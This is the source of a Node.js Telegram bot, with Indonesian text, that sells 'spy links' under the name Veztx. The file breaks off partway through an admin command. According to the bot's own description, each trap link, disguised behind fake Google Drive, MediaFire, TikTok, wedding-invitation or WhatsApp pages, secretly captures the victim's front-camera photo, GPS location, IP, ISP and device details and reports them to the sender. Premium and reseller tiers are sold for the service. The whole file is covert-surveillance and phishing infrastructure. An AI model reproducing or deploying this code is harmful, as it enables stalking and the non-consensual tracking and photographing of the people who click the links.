const TelegramBot = require('node-telegram-bot-api');
require("dotenv").config();
const fs = require('fs');
const crypto = require("crypto");
const chalk = require('chalk');
const axios = require('axios');
const { TokenS, admins, ownerId } = require("./database/settings");
const { githubRepo2, allUsersPath, githubToken } = require("./database/github");

const bot = new TelegramBot(TokenS, { polling: true });

// ==================== KONFIGURASI ====================
const USER_LANG_FILE = './database/user_lang.json';
const ORDERS_FILE = './database/orders.json';
const SPY_LINKS_FILE = './database/spy_links.json';
const TEMPLATE_FILE = './database/templates.json';
const SHORT_LINKS_FILE = './database/short_links.json';
const CAPTURES_FILE = './database/captures.json';

if (!fs.existsSync('./database')) fs.mkdirSync('./database');
if (!fs.existsSync(USER_LANG_FILE)) fs.writeFileSync(USER_LANG_FILE, JSON.stringify({}));
if (!fs.existsSync(ORDERS_FILE)) fs.writeFileSync(ORDERS_FILE, JSON.stringify([]));
if (!fs.existsSync(SPY_LINKS_FILE)) fs.writeFileSync(SPY_LINKS_FILE, JSON.stringify({}));
if (!fs.existsSync(TEMPLATE_FILE)) fs.writeFileSync(TEMPLATE_FILE, JSON.stringify({}));
if (!fs.existsSync(SHORT_LINKS_FILE)) fs.writeFileSync(SHORT_LINKS_FILE, JSON.stringify({}));
if (!fs.existsSync(CAPTURES_FILE)) fs.writeFileSync(CAPTURES_FILE, JSON.stringify({}));

// ==================== GLOBAL VARIABLES ====================
let usersCache = null;
let usersSha = null;
let usersCacheTime = 0;
const CACHE_TIME = 15000;
let userStates = {};
const BASE_DOMAIN = process.env.VERCEL_URL || 'https://spy-link-bot.vercel.app';

const getUsersAPI = () =>
  `https://api.github.com/repos/${githubRepo2}/contents/${allUsersPath}`;

// ==================== FUNGSI BANTUAN ====================
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
const isOwner = (userId) => String(userId) === String(ownerId);

const isAdmin = async (userId) => {
  try {
    const userIdStr = String(userId);
    if (isOwner(userIdStr)) return true;
    const premiumStatus = await isPremiumUser(userIdStr);
    return premiumStatus;
  } catch (e) {
    console.error("Error checking admin/premium status:", e);
    return false;
  }
};

// ==================== SISTEM USER GITHUB ====================
const getAllUsers = async (force = false) => {
  const now = Date.now();
  if (!force && usersCache && (now - usersCacheTime < CACHE_TIME)) {
    return usersCache;
  }

  try {
    const res = await axios.get(getUsersAPI(), {
      headers: { Authorization: `token ${githubToken}` }
    });

    usersSha = res.data.sha;
    const content = Buffer.from(res.data.content, "base64").toString();
    let data = JSON.parse(content);

    if (Array.isArray(data.users)) {
      let newUsersObj = {};
      data.users.forEach(id => {
        newUsersObj[String(id)] = {
          role: 'regular',
          premium: false,
          premiumExpired: 0,
          links: [],
          captures: 0,
          maxLinks: 3,
          referral: { referredBy: null, total: 0 }
        };
      });
      data.users = newUsersObj;
    } else if (typeof data.users === 'object') {
      for (let id in data.users) {
        if (typeof data.users[id] !== 'object') {
          data.users[id] = {
            role: 'regular',
            premium: false,
            premiumExpired: 0,
            links: [],
            captures: 0,
            maxLinks: 3,
            referral: { referredBy: null, total: 0 }
          };
        }
      }
    }

    usersCache = data;
    usersCacheTime = now;
    return data;
  } catch (err) {
    console.error("Gagal Fetch GitHub:", err.message);
    return { users: {} };
  }
};

const saveAllUsers = async (data, retry = true) => {
  try {
    await axios.put(getUsersAPI(), {
      message: "Update database users",
      content: Buffer.from(JSON.stringify(data, null, 2)).toString("base64"),
      sha: usersSha
    }, {
      headers: { Authorization: `token ${githubToken}` }
    });
    usersCache = data;
    usersCacheTime = Date.now();
    console.log("✅ Data berhasil di-push ke GitHub");
  } catch (err) {
    if (err.response?.status === 409 && retry) {
      await getAllUsers(true);
      await saveAllUsers(data, false);
    } else {
      console.error("❌ Push GitHub Gagal:", err.response?.data || err.message);
    }
  }
};

// ==================== SISTEM PREMIUM ====================
const isPremiumUser = async (userId) => {
  const data = await getAllUsers(true);
  const user = data.users[String(userId)];
  if (!user) return false;
  if (!user.premium) return false;
  if (user.premiumExpired && Date.now() > user.premiumExpired) {
    user.premium = false;
    await saveAllUsers(data);
    return false;
  }
  return user.premium;
};

const addPremiumUser = async (userId, days = 0) => {
  const data = await getAllUsers(true);
  const user = data.users[String(userId)];
  if (!user) return;
  
  const expired = days === 0 
    ? Date.now() + (99 * 365 * 24 * 60 * 60 * 1000) 
    : Date.now() + (days * 24 * 60 * 60 * 1000);
  
  user.premium = true;
  user.premiumExpired = expired;
  user.maxLinks = 999;
  
  await saveAllUsers(data);
};

// ==================== GENERATE UNIQUE SUBDOMAIN ====================
const generateSubdomain = () => {
  const randomNum = Math.floor(100 + Math.random() * 900);
  return `web${randomNum}`;
};

// ==================== SISTEM SPY LINKS ====================
const createSpyLink = async (userId, originalUrl) => {
  const data = await getAllUsers(true);
  const user = data.users[String(userId)];
  if (!user) return null;

  const isPremium = await isPremiumUser(userId);
  const maxLinks = isPremium ? 999 : 3;
  
  const activeLinks = user.links ? user.links.filter(l => l.active).length : 0;
  if (activeLinks >= maxLinks) {
    return { error: isPremium ? 'Limit tidak terbatas, ada masalah sistem' : 'Batas link 3 untuk regular. Upgrade ke Premium untuk unlimited!' };
  }

  const randomCode = crypto.randomBytes(6).toString('base64url');
  const subdomain = generateSubdomain();
  const baseUrl = BASE_DOMAIN.replace('https://', '');
  const spyUrl = `https://${subdomain}.${baseUrl}/s/${randomCode}`;

  const spyData = JSON.parse(fs.readFileSync(SPY_LINKS_FILE, 'utf8'));
  spyData[randomCode] = {
    userId: String(userId),
    originalUrl: originalUrl,
    subdomain: subdomain,
    template: 'google',
    createdAt: Date.now(),
    clicks: 0,
    captures: [],
    active: true,
    type: 'spy'
  };
  fs.writeFileSync(SPY_LINKS_FILE, JSON.stringify(spyData, null, 2));

  if (!user.links) user.links = [];
  user.links.push({
    shortCode: randomCode,
    originalUrl: originalUrl,
    subdomain: subdomain,
    template: 'google',
    spyUrl: spyUrl,
    createdAt: Date.now(),
    active: true,
    type: 'spy'
  });
  await saveAllUsers(data);

  return {
    spyUrl: spyUrl,
    shortCode: randomCode,
    subdomain: subdomain,
    template: 'google',
    originalUrl: originalUrl
  };
};

// ==================== SISTEM TEMPLATE ====================
const createTemplateLink = async (userId, template, targetUrl, photoFileId = null) => {
  const isPremium = await isPremiumUser(userId);
  if (!isPremium) return { error: 'Fitur ini hanya untuk Premium!' };

  const data = await getAllUsers(true);
  const user = data.users[String(userId)];
  if (!user) return { error: 'User tidak ditemukan' };

  const randomCode = crypto.randomBytes(6).toString('base64url');
  const subdomain = generateSubdomain();
  const baseUrl = BASE_DOMAIN.replace('https://', '');
  const spyUrl = `https://${subdomain}.${baseUrl}/t/${randomCode}`;
  
  const templateData = JSON.parse(fs.readFileSync(TEMPLATE_FILE, 'utf8'));
  templateData[randomCode] = {
    userId: String(userId),
    template: template,
    targetUrl: targetUrl,
    subdomain: subdomain,
    photoFileId: photoFileId,
    createdAt: Date.now(),
    active: true,
    type: 'template'
  };
  fs.writeFileSync(TEMPLATE_FILE, JSON.stringify(templateData, null, 2));

  if (!user.links) user.links = [];
  user.links.push({
    shortCode: randomCode,
    targetUrl: targetUrl,
    subdomain: subdomain,
    template: template,
    spyUrl: spyUrl,
    createdAt: Date.now(),
    active: true,
    type: 'template'
  });
  await saveAllUsers(data);

  return {
    spyUrl: spyUrl,
    template: template,
    shortCode: randomCode,
    subdomain: subdomain
  };
};

// ==================== SISTEM SHORTURL ====================
const createShortUrl = async (originalUrl) => {
  const randomCode = crypto.randomBytes(4).toString('hex');
  const subdomain = generateSubdomain();
  const baseUrl = BASE_DOMAIN.replace('https://', '');
  const shortUrl = `https://${subdomain}.${baseUrl}/sh/${randomCode}`;
  
  const shortData = JSON.parse(fs.readFileSync(SHORT_LINKS_FILE, 'utf8'));
  shortData[randomCode] = {
    originalUrl: originalUrl,
    subdomain: subdomain,
    createdAt: Date.now()
  };
  fs.writeFileSync(SHORT_LINKS_FILE, JSON.stringify(shortData, null, 2));
  
  return shortUrl;
};

// ==================== SPY REPORT FORMAT ====================
const formatSpyReport = (data) => {
  let report = `🔍 SPY REPORT — ${data.type || '📸 Photo & Lokasi'}\n`;
  report += `━━━━━━━━━━━━━━━━━━━━━━\n\n`;
  
  // JARINGAN
  report += `📡 JARINGAN\n`;
  report += `├ IP       : ${data.ip || 'Tidak diketahui'}\n`;
  report += `├ Negara   : ${data.country || 'Tidak diketahui'}\n`;
  report += `├ Kota     : ${data.city || 'Tidak diketahui'}\n`;
  report += `├ Wilayah  : ${data.region || 'Tidak diketahui'}\n`;
  report += `└ ISP      : ${data.isp || 'Tidak diketahui'}\n\n`;
  
  // PERANGKAT
  report += `📱 PERANGKAT\n`;
  report += `├ Browser  : ${data.browser || 'Tidak diketahui'}\n`;
  report += `├ Engine   : ${data.engine || 'Tidak diketahui'}\n`;
  report += `├ OS       : ${data.os || 'Tidak diketahui'}\n`;
  report += `├ Device   : ${data.device || 'Tidak diketahui'}\n`;
  report += `├ RAM      : ${data.ram || '~8 GB (perkiraan)'}\n`;
  report += `└ Baterai  : ${data.battery || 'Tidak diketahui'}\n\n`;
  
  // LOKASI GPS (jika ada)
  if (data.lat && data.lng) {
    report += `📍 LOKASI GPS\n`;
    report += `├ Koordinat: ${data.lat}, ${data.lng}\n`;
    report += `└ Akurasi  : ${data.accuracy || 'Tidak diketahui'}\n\n`;
  }
  
  // SESI
  report += `🌐 SESI\n`;
  if (data.fromUrl) {
    report += `├ Dari URL : ${data.fromUrl}\n`;
  }
  report += `└ UA       : ${data.userAgent || 'Tidak diketahui'}\n`;
  
  // Status Kamera
  if (data.photoStatus) {
    report += `\n📷 ${data.photoStatus}`;
  } else if (data.photo) {
    report += `\n📷 Foto berhasil diambil ✅`;
  } else {
    report += `\n📷 Kamera ditolak/gagal`;
  }
  
  // Maps link jika ada lokasi
  if (data.lat && data.lng) {
    report += `\n\n🗺️ Maps: https://www.google.co.id/maps/place/${data.lat},${data.lng}`;
  }
  
  return report;
};

// ==================== FUNGSI SEND SPY REPORT ====================
const sendSpyReport = async (userId, reportData, photoFileId = null) => {
  try {
    const reportText = formatSpyReport(reportData);
    
    // Kirim report ke pembuat link
    if (photoFileId) {
      await bot.sendPhoto(userId, photoFileId, {
        caption: reportText,
        parse_mode: "Markdown"
      });
    } else {
      await bot.sendMessage(userId, reportText, {
        parse_mode: "Markdown"
      });
    }
    
    // Kirim lokasi jika ada
    if (reportData.lat && reportData.lng) {
      await bot.sendLocation(userId, reportData.lat, reportData.lng);
    }
    
    return true;
  } catch (err) {
    console.error('Gagal kirim report:', err.message);
    return false;
  }
};

// ==================== FUNGSI GET USER LINKS ====================
const getUserLinks = async (userId) => {
  const data = await getAllUsers(true);
  const user = data.users[String(userId)];
  if (!user || !user.links) return [];
  return user.links.filter(link => link.active);
};

// ==================== MENU UTAMA ====================
const getMainMenu = () => {
  return {
    inline_keyboard: [
      [{ text: "Buat Link Spy", callback_data: "buat_link_spy" }],
      [{ text: "Link Saya", callback_data: "link_saya" }],
      [{ text: "Template", callback_data: "template" }],
      [{ text: "Profile", callback_data: "profile" }],
      [{ text: "ShortURL", callback_data: "shorturl" }],
      [{ text: "Upgrade Premium", callback_data: "upgrade_premium" }],
      [{ text: "Beli Reseller", callback_data: "beli_reseller" }],
      [{ text: "Owner", callback_data: "owner" }]
    ]
  };
};

// ==================== MENU TEMPLATE ====================
const getTemplateMenu = () => {
  return {
    inline_keyboard: [
      [{ text: "GoogleDrive", callback_data: "template_google" }],
      [{ text: "MediaFire", callback_data: "template_mediafire" }],
      [{ text: "TikTok", callback_data: "template_tiktok" }],
      [{ text: "Undangan Pernikahan", callback_data: "template_wedding" }],
      [{ text: "WhatsApp Grup/Channel", callback_data: "template_whatsapp" }],
      [{ text: "Menu", callback_data: "menu" }]
    ]
  };
};

// ==================== MENU UPGRADE ====================
const getUpgradeMenu = () => {
  return {
    inline_keyboard: [
      [{ text: "Weekly (7 hari - Rp 30.000)", callback_data: "upgrade_weekly" }],
      [{ text: "Monthly (30 hari - Rp 75.000)", callback_data: "upgrade_monthly" }],
      [{ text: "Lifetime (Permanent - Rp 190.000)", callback_data: "upgrade_lifetime" }],
      [{ text: "One-Day Access (1 hari - Rp 5.000)", callback_data: "upgrade_day" }],
      [{ text: "promo 1 hari (Permanent - Rp 65.000)", callback_data: "upgrade_promo" }],
      [{ text: "Menu", callback_data: "menu" }]
    ]
  };
};

// ==================== MENU RESELLER ====================
const getResellerMenu = () => {
  return {
    inline_keyboard: [
      [{ text: "Basic Reseller - Rp 100.000", callback_data: "reseller_basic" }],
      [{ text: "Pro Reseller - Rp 250.000", callback_data: "reseller_pro" }],
      [{ text: "Master Reseller - Rp 500.000", callback_data: "reseller_master" }],
      [{ text: "Menu", callback_data: "menu" }]
    ]
  };
};

// ==================== HANDLER COMMAND /START ====================
bot.onText(/\/start(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = String(msg.from.id);
  const name = msg.from.first_name;
  const refCode = match[1];

  const data = await getAllUsers(true);
  
  if (!data.users[userId] || typeof data.users[userId] !== 'object') {
    data.users[userId] = {
      role: 'regular',
      premium: false,
      premiumExpired: 0,
      links: [],
      captures: 0,
      maxLinks: 3,
      referral: { referredBy: null, total: 0 }
    };
    await saveAllUsers(data);
  }

  if (refCode && refCode.startsWith("ref_")) {
    const referrerId = refCode.split("_")[1];
    if (referrerId !== userId && data.users[referrerId]) {
      data.users[userId].referral.referredBy = referrerId;
      data.users[referrerId].referral.total += 1;
      await saveAllUsers(data);
      bot.sendMessage(referrerId, `👤 Seseorang bergabung menggunakan link kamu! (Total: ${data.users[referrerId].referral.total} orang)`);
    }
  }

  const welcomeText = `Veztx
by veszet

Veztx – Regular

veztxbot – alat intelijen digital yang bekerja melalui tautan rekayasa sosial. Begitu target mengklik tautan via browser, sistem secara diam-diam mengakses kamera depan dan lokasi perangkat, lalu mengirimkan data tersebut ke pengirim secara instan.

Selamat datang, ${name}!
Pilih menu:`;

  bot.sendMessage(chatId, welcomeText, {
    parse_mode: "Markdown",
    reply_markup: getMainMenu()
  });
});

// ==================== HANDLER CALLBACK QUERY ====================
bot.on("callback_query", async (query) => {
  const chatId = query.message.chat.id;
  const messageId = query.message.message_id;
  const userId = String(query.from.id);
  const data = query.data;

  await bot.deleteMessage(chatId, messageId).catch(() => {});

  if (data === "menu") {
    const dataUser = await getAllUsers(true);
    const name = query.from.first_name;
    
    const welcomeText = `Veztx
by veszet

Veztx – Regular

veztxbot – alat intelijen digital yang bekerja melalui tautan rekayasa sosial. Begitu target mengklik tautan via browser, sistem secara diam-diam mengakses kamera depan dan lokasi perangkat, lalu mengirimkan data tersebut ke pengirim secara instan.

Selamat datang, ${name}!
Pilih menu:`;

    bot.sendMessage(chatId, welcomeText, {
      parse_mode: "Markdown",
      reply_markup: getMainMenu()
    });
    return bot.answerCallbackQuery(query.id);
  }

  if (data === "buat_link_spy") {
    userStates[userId] = { state: 'waiting_spy_url' };
    bot.sendMessage(chatId, "Kirim URL yang ingin dijadikan jebakan:\n\nContoh: https://www.google.com/\n\n/cancel untuk batal", {
      reply_markup: {
        inline_keyboard: [
          [{ text: "Batal", callback_data: "menu" }]
        ]
      }
    });
    return bot.answerCallbackQuery(query.id);
  }

  if (data === "link_saya") {
    const userLinks = await getUserLinks(userId);
    
    if (!userLinks || userLinks.length === 0) {
      bot.sendMessage(chatId, "Tidak ada link aktif", {
        reply_markup: {
          inline_keyboard: [
            [{ text: "Buat Link Spy", callback_data: "buat_link_spy" }],
            [{ text: "Menu", callback_data: "menu" }]
          ]
        }
      });
    } else {
      let text = "Link Saya:\n\n";
      userLinks.forEach((link, index) => {
        const type = link.type === 'template' ? 'Template' : 'Spy';
        text += `${index + 1}. [${type}] ${link.spyUrl}\n`;
        text += `   Subdomain: ${link.subdomain || '-'}\n`;
        if (link.type === 'template') {
          text += `   Template: ${link.template}\n`;
          text += `   Target: ${link.targetUrl || '-'}\n`;
        } else {
          text += `   Template: ${link.template}\n`;
          text += `   Redirect: ${link.originalUrl}\n`;
        }
        text += `   Created: ${new Date(link.createdAt).toLocaleString()}\n\n`;
      });
      
      bot.sendMessage(chatId, text, {
        reply_markup: {
          inline_keyboard: [
            [{ text: "Buat Link Spy", callback_data: "buat_link_spy" }],
            [{ text: "Menu", callback_data: "menu" }]
          ]
        }
      });
    }
    return bot.answerCallbackQuery(query.id);
  }

  if (data === "template") {
    const isPremium = await isPremiumUser(userId);
    if (!isPremium) {
      bot.sendMessage(chatId, "❌ Fitur ini hanya untuk Premium!", {
        reply_markup: {
          inline_keyboard: [
            [{ text: "Upgrade Premium", callback_data: "upgrade_premium" }],
            [{ text: "Menu", callback_data: "menu" }]
          ]
        }
      });
      return bot.answerCallbackQuery(query.id);
    }

    bot.sendMessage(chatId, "Template Spy\n\nPilih template halaman palsu yang akan digunakan sebagai jebakan.\nTarget akan melihat halaman asli tampak nyata, saat berinteraksi data mereka terkirim.", {
      reply_markup: getTemplateMenu()
    });
    return bot.answerCallbackQuery(query.id);
  }

  if (data === "profile") {
    const dataUser = await getAllUsers(true);
    const user = dataUser.users[userId];
    const activeLinks = user.links ? user.links.filter(l => l.active).length : 0;
    const role = user.premium ? 'Premium' : 'Regular';
    const maxLinks = user.premium ? '999' : '3';
    
    const profileText = `Profile
${userId}
Role: ${role}
Link: ${activeLinks} / ${maxLinks}
Capture: ${user.captures || 0} (maks. link: ${maxLinks})`;

    bot.sendMessage(chatId, profileText, {
      reply_markup: {
        inline_keyboard: [
          [{ text: "Menu", callback_data: "menu" }]
        ]
      }
    });
    return bot.answerCallbackQuery(query.id);
  }

  if (data === "shorturl") {
    userStates[userId] = { state: 'waiting_shorturl' };
    bot.sendMessage(chatId, "ShortURL\n\nKirim URL yang ingin dipersingkat:\n\nContoh: https://chat.deepseek.com/a/chat/s/...\n\n/cancel untuk batal", {
      reply_markup: {
        inline_keyboard: [
          [{ text: "Batal", callback_data: "menu" }]
        ]
      }
    });
    return bot.answerCallbackQuery(query.id);
  }

  if (data === "upgrade_premium") {
    const upgradeText = `⭐ Upgrade ke Premium

Dengan Premium kamu bisa:
- Buat link spy unlimited
- Hapus link kapan saja
- Mode Photo & Video unlimited
- Prioritas support

Pilih paket & bayar via QRIS:`;

    bot.sendMessage(chatId, upgradeText, {
      reply_markup: getUpgradeMenu()
    });
    return bot.answerCallbackQuery(query.id);
  }

  if (data === "beli_reseller") {
    bot.sendMessage(chatId, "⭐ Beli Reseller\n\nDapatkan keuntungan menjadi reseller!\n\nPilih paket reseller:", {
      reply_markup: getResellerMenu()
    });
    return bot.answerCallbackQuery(query.id);
  }

  if (data === "owner") {
    bot.sendMessage(chatId, "Hubungi Owner:\nhttps://t.me/lexxyatc");
    return bot.answerCallbackQuery(query.id);
  }

  if (data.startsWith("template_")) {
    const template = data.replace("template_", "");
    const templateNames = {
      google: 'GoogleDrive',
      mediafire: 'MediaFire',
      tiktok: 'TikTok',
      wedding: 'Undangan Pernikahan',
      whatsapp: 'WhatsApp Grup/Channel'
    };
    
    userStates[userId] = { 
      state: 'waiting_template_url', 
      template: template,
      templateDisplay: templateNames[template] || template
    };
    
    bot.sendMessage(chatId, `Template: ${templateNames[template] || template}\n\nKirim URL target yang akan dijadikan jebakan:\n\nContoh: https://www.google.com/\n\n/cancel untuk batal`, {
      reply_markup: {
        inline_keyboard: [
          [{ text: "Batal", callback_data: "menu" }]
        ]
      }
    });
    return bot.answerCallbackQuery(query.id);
  }

  if (data.startsWith("upgrade_")) {
    const packageType = data.replace("upgrade_", "");
    let price = 0;
    let days = 0;
    let label = "";

    switch(packageType) {
      case 'weekly':
        price = 30000;
        days = 7;
        label = 'Weekly (7 hari)';
        break;
      case 'monthly':
        price = 75000;
        days = 30;
        label = 'Monthly (30 hari)';
        break;
      case 'lifetime':
        price = 190000;
        days = 0;
        label = 'Lifetime (Permanent)';
        break;
      case 'day':
        price = 5000;
        days = 1;
        label = 'One-Day Access (1 hari)';
        break;
      case 'promo':
        price = 65000;
        days = 0;
        label = 'promo 1 hari (Permanent)';
        break;
    }

    userStates[userId] = {
      state: 'waiting_qris',
      package: packageType,
      price: price,
      days: days,
      label: label
    };

    bot.sendMessage(chatId, `💳 PEMBAYARAN QRIS\n\nPaket: ${label}\nHarga: Rp ${price.toLocaleString()}\n\nKirim gambar QRIS Anda untuk pembayaran:\n\n/cancel untuk batal`, {
      reply_markup: {
        inline_keyboard: [
          [{ text: "Batal", callback_data: "menu" }]
        ]
      }
    });
    return bot.answerCallbackQuery(query.id);
  }

  if (data.startsWith("reseller_")) {
    const packageType = data.replace("reseller_", "");
    let price = 0;
    let label = "";

    switch(packageType) {
      case 'basic':
        price = 100000;
        label = 'Basic Reseller';
        break;
      case 'pro':
        price = 250000;
        label = 'Pro Reseller';
        break;
      case 'master':
        price = 500000;
        label = 'Master Reseller';
        break;
    }

    userStates[userId] = {
      state: 'waiting_qris_reseller',
      package: packageType,
      price: price,
      label: label,
      isReseller: true
    };

    bot.sendMessage(chatId, `💳 PEMBAYARAN QRIS\n\nPaket: ${label}\nHarga: Rp ${price.toLocaleString()}\n\nKirim gambar QRIS Anda untuk pembayaran:\n\n/cancel untuk batal`, {
      reply_markup: {
        inline_keyboard: [
          [{ text: "Batal", callback_data: "menu" }]
        ]
      }
    });
    return bot.answerCallbackQuery(query.id);
  }

  bot.answerCallbackQuery(query.id);
});

// ==================== HANDLER MESSAGE ====================
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const userId = String(msg.from.id);
  const text = msg.text;

  if (text === '/cancel') {
    delete userStates[userId];
    const dataUser = await getAllUsers(true);
    const name = msg.from.first_name;
    
    const welcomeText = `Veztx
by veszet

Veztx – Regular

veztxbot – alat intelijen digital yang bekerja melalui tautan rekayasa sosial. Begitu target mengklik tautan via browser, sistem secara diam-diam mengakses kamera depan dan lokasi perangkat, lalu mengirimkan data tersebut ke pengirim secara instan.

Selamat datang, ${name}!
Pilih menu:`;

    bot.sendMessage(chatId, "❌ Dibatalkan. Kembali ke menu.");
    bot.sendMessage(chatId, welcomeText, {
      parse_mode: "Markdown",
      reply_markup: getMainMenu()
    });
    return;
  }

  const state = userStates[userId];
  if (!state) return;

  if (state.state === 'waiting_spy_url') {
    if (!text || !text.startsWith('http')) {
      bot.sendMessage(chatId, "❌ URL tidak valid. Silakan kirim URL yang benar.", {
        reply_markup: {
          inline_keyboard: [
            [{ text: "Batal", callback_data: "menu" }]
          ]
        }
      });
      return;
    }

    const result = await createSpyLink(userId, text);
    
    if (result && result.error) {
      bot.sendMessage(chatId, result.error, {
        reply_markup: {
          inline_keyboard: [
            [{ text: "Batal", callback_data: "menu" }]
          ]
        }
      });
    } else if (result) {
      const linkText = `Link Berhasil Dibuat!

Template: Google
Mode: Photo & Lokasi

Link Jebakan:
${result.spyUrl}

Subdomain: ${result.subdomain}

Kirim ke target - saat dibuka akan menjalankan mode Photo & Lokasi.`;

      bot.sendMessage(chatId, linkText, {
        reply_markup: {
          inline_keyboard: [
            [{ text: "Salin URL Spy", callback_data: `copy_${result.shortCode}` }],
            [{ text: "Buat Lagi", callback_data: "buat_link_spy" }],
            [{ text: "List", callback_data: "link_saya" }],
            [{ text: "Menu", callback_data: "menu" }]
          ]
        }
      });
      delete userStates[userId];
    }
    return;
  }

  if (state.state === 'waiting_template_url') {
    if (!text || !text.startsWith('http')) {
      bot.sendMessage(chatId, "❌ URL tidak valid. Silakan kirim URL yang benar.", {
        reply_markup: {
          inline_keyboard: [
            [{ text: "Batal", callback_data: "menu" }]
          ]
        }
      });
      return;
    }

    userStates[userId] = {
      ...state,
      state: 'waiting_template_photo',
      targetUrl: text
    };
    
    bot.sendMessage(chatId, `URL target: ${text}\n\nSekarang kirim foto untuk tampilan halaman jebakan (kirim gambar):\n\nKetik /skip untuk menggunakan default\n\n/cancel untuk batal`, {
      reply_markup: {
        inline_keyboard: [
          [{ text: "Batal", callback_data: "menu" }]
        ]
      }
    });
    return;
  }

  if (state.state === 'waiting_template_photo') {
    let photoFileId = null;
    
    if (msg.photo) {
      photoFileId = msg.photo[msg.photo.length - 1].file_id;
    } else if (text === '/skip') {
      photoFileId = null;
    } else {
      bot.sendMessage(chatId, "❌ Silakan kirim gambar atau /skip", {
        reply_markup: {
          inline_keyboard: [
            [{ text: "Batal", callback_data: "menu" }]
          ]
        }
      });
      return;
    }

    const result = await createTemplateLink(
      userId, 
      state.template, 
      state.targetUrl, 
      photoFileId
    );
    
    if (result && result.error) {
      bot.sendMessage(chatId, result.error, {
        reply_markup: {
          inline_keyboard: [
            [{ text: "Menu", callback_data: "menu" }]
          ]
        }
      });
    } else if (result) {
      const linkText = `Template Link Berhasil Dibuat!

Template: ${state.templateDisplay || state.template}
Target: ${state.targetUrl}
Link Jebakan:
${result.spyUrl}

Subdomain: ${result.subdomain}

Kirim ke target - saat dibuka akan menjalankan mode Photo & Lokasi.`;

      bot.sendMessage(chatId, linkText, {
        reply_markup: {
          inline_keyboard: [
            [{ text: "Salin URL", callback_data: `copy_${result.shortCode}` }],
            [{ text: "Buat Lagi", callback_data: "template" }],
            [{ text: "List", callback_data: "link_saya" }],
            [{ text: "Menu", callback_data: "menu" }]
          ]
        }
      });
    }
    delete userStates[userId];
    return;
  }

  if (state.state === 'waiting_shorturl') {
    if (!text || !text.startsWith('http')) {
      bot.sendMessage(chatId, "❌ URL tidak valid. Silakan kirim URL yang benar.", {
        reply_markup: {
          inline_keyboard: [
            [{ text: "Batal", callback_data: "menu" }]
          ]
        }
      });
      return;
    }

    const shortUrl = await createShortUrl(text);
    bot.sendMessage(chatId, `ShortURL berhasil dibuat!\n\n${shortUrl}`, {
      reply_markup: {
        inline_keyboard: [
          [{ text: "Salin URL", callback_data: `copy_short_${shortUrl}` }],
          [{ text: "Buat Lagi", callback_data: "shorturl" }],
          [{ text: "Menu", callback_data: "menu" }]
        ]
      }
    });
    delete userStates[userId];
    return;
  }

  if (state.state === 'waiting_qris' || state.state === 'waiting_qris_reseller') {
    if (!msg.photo) {
      bot.sendMessage(chatId, "❌ Silakan kirim gambar QRIS untuk pembayaran.", {
        reply_markup: {
          inline_keyboard: [
            [{ text: "Batal", callback_data: "menu" }]
          ]
        }
      });
      return;
    }

    const photoId = msg.photo[msg.photo.length - 1].file_id;
    const caption = `💳 PEMBAYARAN QRIS

User: ${userId}
Paket: ${state.label}
Harga: Rp ${state.price.toLocaleString()}
${state.isReseller ? 'Tipe: Reseller' : 'Tipe: Premium'}

Silakan verifikasi pembayaran.`;

    await bot.sendPhoto(ownerId, photoId, { caption: caption });

    const orders = JSON.parse(fs.readFileSync(ORDERS_FILE, 'utf8'));
    orders.push({
      userId: userId,
      chatId: chatId,
      package: state.package,
      price: state.price,
      days: state.days,
      label: state.label,
      isReseller: state.isReseller || false,
      status: 'pending',
      photoId: photoId,
      time: Date.now()
    });
    fs.writeFileSync(ORDERS_FILE, JSON.stringify(orders, null, 2));

    bot.sendMessage(chatId, "✅ QRIS telah dikirim ke owner untuk verifikasi. Mohon tunggu konfirmasi.", {
      reply_markup: {
        inline_keyboard: [
          [{ text: "Menu", callback_data: "menu" }]
        ]
      }
    });

    delete userStates[userId];
    return;
  }
});

// ==================== COMMAND ADMIN ====================
bot.onText(/\/verif (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) return;

  const orderIndex = parseInt(match[1]) - 1;
  const orders = JSON.parse(fs.readFileSync(ORDERS_FILE, 'utf8'));
  
  if (orderIndex < 0 || orderIndex >= orders.length) {
    bot.sendMessage(chatId, "❌ Order tidak ditemukan.");
    return;
  }

  const order = orders[orderIndex];
  if (order.status !== 'pending') {
    bot.sendMessage(chatId, "❌ Order sudah diproses.");
    return;
  }

  await addPremiumUser(order.userId, order.days);
  
  order.status = 'success';
  fs.writeFileSync(ORDERS_FILE, JSON.stringify(orders, null, 2));

  bot.sendMessage(chatId, `✅ Pembayaran berhasil! Premium telah diaktifkan untuk user ${order.userId}`);
  bot.sendMessage(order.chatId, "✅ Pembayaran berhasil! Premium Anda telah aktif.");
});

bot.onText(/\/orders/, async (msg) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) return;

  const orders = JSON.parse(fs.readFileSync(ORDERS_FILE, 'utf8'));
  const pending = orders.filter(o => o.status === 'pending');
  
  if (pending.length === 0) {
    bot.sendMessage(chatId, "📭 Tidak ada order pending.");
    return;
  }

  let text = "📋 PENDING ORDERS:\n\n";
  pending.forEach((order, index) => {
    text += `${index + 1}. User: ${order.userId}\n`;
    text += `   Paket: ${order.label}\n`;
    text += `   Harga: Rp ${order.price.toLocaleString()}\n`;
    text += `   Waktu: ${new Date(order.time).toLocaleString()}\n\n`;
  });

  text += "Gunakan /verif [nomor] untuk verifikasi pembayaran.";

  bot.sendMessage(chatId, text);
});

bot.onText(/\/listpremium/, async (msg) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) return;

  const data = await getAllUsers(true);
  const premiumUsers = Object.entries(data.users)
    .filter(([id, user]) => user.premium)
    .map(([id, user]) => ({ id, ...user }));

  if (premiumUsers.length === 0) {
    bot.sendMessage(chatId, "📭 Tidak ada user premium.");
    return;
  }

  let text = "💎 DAFTAR PREMIUM:\n\n";
  premiumUsers.forEach((user, index) => {
    const expired = user.premiumExpired ? new Date(user.premiumExpired).toLocaleString() : 'Permanen';
    text += `${index + 1}. ID: ${user.id}\n   Expired: ${expired}\n\n`;
  });

  bot.sendMessage(chatId, text);
});

bot.onText(/\/add (\d+) (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) return;

  const targetId = match[1];
  const days = parseInt(match[2]);

  await addPremiumUser(targetId, days);
